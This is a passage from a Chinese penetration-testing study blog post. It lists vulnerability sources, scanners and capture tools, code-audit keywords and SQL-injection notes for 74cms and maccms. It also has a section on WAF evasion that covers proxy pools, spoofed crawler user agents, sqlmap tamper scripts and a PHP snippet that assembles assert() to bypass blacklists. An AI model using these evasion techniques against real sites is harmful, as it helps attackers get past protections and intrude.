+<li>国内漏洞共享平台[<a href="https://www.cnvd.org.cn]">https://www.cnvd.org.cn]</a></li>
+<li>知道创宇[<a href="https://www.seebug.org]">https://www.seebug.org]</a></li>
+<li>1337day[<a target="_blank" rel="noopener" href="https://mrxn.net/share/0day-today.html]">https://mrxn.net/share/0day-today.html]</a></li>
+<li><a target="_blank" rel="noopener" href="https://exploit-db.com/">https://exploit-db.com</a></li>
+<li>Packetstorm Security</li>
+</ul>
+<h4 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h4><ul>
+<li>打补丁</li>
+<li>360 …</li>
+<li>关闭入口</li>
+<li>防护应用</li>
+</ul>
+<h3 id="web漏洞"><a href="#web漏洞" class="headerlink" title="web漏洞"></a>web漏洞</h3><h4 id="已知cms"><a href="#已知cms" class="headerlink" title="已知cms"></a>已知cms</h4><ul>
+<li>如常见的dedecms.discuz,wordpress等源码结构，可利用公开的漏洞(vulhub,seebug…)进行测试，或者自行下载cms代码进行白盒审计</li>
+</ul>
+<h4 id="已知开发框架"><a href="#已知开发框架" class="headerlink" title="已知开发框架"></a>已知开发框架</h4><ul>
+<li>如thinkphp, spring, flask等开发的源码程序，获取相应的框架信息，通过公共的安全问题进行测试，如果不存在则自行白盒审计</li>
+</ul>
+<h4 id="未知cms"><a href="#未知cms" class="headerlink" title="未知cms"></a>未知cms</h4><ul>
+<li>可能是企业的或个人的内部程序源码，也可能是某cms二次开发的源码结构，针对此类源码程序，如果能识别出二次开发就按已知的cms思路进行，不能确定二次开发的话可以利用常规综合类扫描工具或脚本进行漏扫，也可以人工探针(功能点，参数，盲猜)，如果能拿到源码则进行白盒审计</li>
+</ul>
+<h5 id="漏扫工具"><a href="#漏扫工具" class="headerlink" title="漏扫工具"></a>漏扫工具</h5><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42248871/article/details/120981838">Xray简单使用</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/384677028">AWVS下载、安装、使用教程</a></li>
+<li>appscan</li>
+</ul>
+<h3 id="app漏洞"><a href="#app漏洞" class="headerlink" title="app漏洞"></a>app漏洞</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><h5 id="http-https"><a href="#http-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h5><ul>
+<li>burp</li>
+<li>charles</li>
+<li>fiddler</li>
+<li>抓包精灵</li>
+</ul>
+<h5 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h5><ul>
+<li>wireshark</li>
+</ul>
+<h5 id="burp＋xray"><a href="#burp＋xray" class="headerlink" title="burp＋xray"></a>burp＋xray</h5><p>利用burp抓包转发到本机端口(6666) xray监听本机6666端口被动扫描</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xray<span class="hljs-selector-class">.exe</span> webscan <span class="hljs-attr">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><ul>
+<li>漏了个大洞</li>
+<li>一键反编译</li>
+</ul>
+<h3 id="服务协议"><a href="#服务协议" class="headerlink" title="服务协议"></a>服务协议</h3><h4 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h4><ul>
+<li>web服务类</li>
+<li>数据库类</li>
+<li>大数据类</li>
+<li>文件共享</li>
+<li>远程访问</li>
+<li>邮件服务</li>
+<li>其他服务</li>
+</ul>
+<h4 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h4><ul>
+<li>基于网页的可利用burp爆破</li>
+<li>基于协议(ssh,mysql等)的弱口令爆破可利用工具</li>
+</ul>
+<h4 id="api接口"><a href="#api接口" class="headerlink" title="api接口"></a>api接口</h4><ul>
+<li>部分网站调用接口api(如WSDL)可利用漏扫工具扫描</li>
+</ul>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
+<h4 id="反爬虫延时代理池"><a href="#反爬虫延时代理池" class="headerlink" title="反爬虫延时代理池"></a>反爬虫延时代理池</h4><ul>
+<li>延时爬取</li>
+<li>百度等爬虫头</li>
+<li>付费代理池</li>
+</ul>
+<h4 id="代理池指纹被动探针"><a href="#代理池指纹被动探针" class="headerlink" title="代理池指纹被动探针"></a>代理池指纹被动探针</h4><p><strong>扫描工具的指纹(如ua或者一些payload) 容易被waf记录并识别 此时可以采用一些方法来进行绕过</strong></p>
+<ul>
+<li>代理池 Proxy_pool (搭过 免费的极不好用  建议充钱)</li>
+<li>延时 被动扫描  </li>
+<li>payload绕过</li>
+</ul>
+<h5 id="工具之间的联动"><a href="#工具之间的联动" class="headerlink" title="工具之间的联动"></a>工具之间的联动</h5><ul>
+<li>使用awvs(初次扫描，控制速度) + burp(查看发包速度和数据) + xray(二次扫描)</li>
+<li>xray无法控制延时和UA 所以用awvs控制  两次扫描可以一定程度上避免payload识别拦截</li>
+</ul>
+<h4 id="漏洞利用-可能被拦截的洞"><a href="#漏洞利用-可能被拦截的洞" class="headerlink" title="漏洞利用(可能被拦截的洞)"></a>漏洞利用(可能被拦截的洞)</h4><h5 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入"></a>sql注入</h5><ul>
+<li>sqlmap  上代理过cc  UA爬虫头过工具指纹黑名单</li>
+<li>自己编写tamper模块 绕各种payload拦截</li>
+</ul>
+<h5 id="文件上传-2"><a href="#文件上传-2" class="headerlink" title="文件上传"></a>文件上传</h5><ul>
+<li><p>文件名回车截断</p>
+<p><a href="#upload_waf">前文提到</a></p>
+</li>
+</ul>
+<h5 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h5><ul>
+<li><a href="#xss_bypass">xss_bypass</a></li>
+<li>xsstrike(工具 可以配置代理和延时)</li>
+</ul>
+<h5 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">文件包含</a></h5><h5 id="RCE执行"><a href="#RCE执行" class="headerlink" title="RCE执行"></a>RCE执行</h5><ul>
+<li>十六进制编码解码 利用assert()函数执行</li>
+<li>str_replace 进行字符替换绕过黑名单</li>
+<li>变量拆分组合 <code>$a=&quot;asse&quot;;$b=&quot;rt&quot;;$c=$a.$b;$c()</code></li>
+<li>更改请求方式 <code>get post request</code></li>
+</ul>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h4><ul>
+<li>使用fortify进行白盒审计(任意类型文件)</li>
+<li>使用seay进行php审计</li>
+</ul>
+<h4 id="手工-脚本审计"><a href="#手工-脚本审计" class="headerlink" title="手工&#x2F;脚本审计"></a>手工&#x2F;脚本审计</h4><h5 id="关键字搜索"><a href="#关键字搜索" class="headerlink" title="关键字搜索"></a>关键字搜索</h5><ul>
+<li>接受参数 <code>$_get</code> 之类的 和 输出类函数 如<code>echo</code></li>
+<li>数据库操作关键词 <code>select</code> <code>insert</code> <code>update</code> <code>sql执行语句</code></li>
+<li>命令执行关键词 <code>exec</code></li>
+</ul>
+<h5 id="功能点"><a href="#功能点" class="headerlink" title="功能点"></a>功能点</h5><ul>
+<li>文件传输处(如会员中心)可能存在文件上传 文件读取 文件执行</li>
+<li>登录框存在xss sql注入</li>
+</ul>
+<h5 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h5><ul>
+<li>执行过程前后顺序</li>
+<li>调用文件列表</li>
+</ul>
+<h4 id="php无框架sql注入"><a href="#php无框架sql注入" class="headerlink" title="php无框架sql注入"></a>php无框架sql注入</h4><ul>
+<li><p>绕过魔术引号 宽字节注入 二次注入</p>
+</li>
+<li><p>php源码审计工具-&gt;数据库监控  看数据库交互</p>
+</li>
+<li><p><strong>74cms 二次注入 先insert再update 更新的时候语句被执行</strong></p>
+</li>
+<li><p>数据库监视脚本网页版(运行在web端)</p>
+</li>
+<li><p><strong>maccms源码</strong> get方式会识别url编码 可以用二次编码绕过强制性的编码替换</p>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0/" class="print-no-link">#学习</a>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+        <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="print-no-link">#知识点</a>
+      
+        <a href="/tags/%E5%B0%8F%E8%BF%AA%E5%85%AC%E5%BC%80%E8%AF%BE/" class="print-no-link">#小迪公开课</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>网安学习笔记(持续更新中)</div>
+      <div>https://just1greed.github.io/2023/11/26/网安学习笔记-持续更新中/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Greed</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年11月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/26/hacksudoLPE/" title="hacksudoLPE">
+                        <span class="hidden-mobile">hacksudoLPE</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://cdn.staticfile.org/waline/2.15.5/waline.min.css')
+      Fluid.utils.createScript('https://cdn.staticfile.org/waline/2.15.5/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"http://118.25.19.88:8360","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
